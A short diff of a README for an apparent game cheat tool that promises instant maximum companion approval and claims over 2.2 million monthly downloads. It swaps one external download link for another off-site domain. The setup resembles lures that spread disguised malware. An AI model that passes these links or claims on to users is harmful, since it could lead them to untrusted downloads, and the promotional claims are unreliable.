@@ -70,7 +70,7 @@ A: Yes — max approval with all companions instantly.
 
 **Monthly downloads:** 2.2m+
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/daveilguard)
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/daveilguard)
 
 ---
 
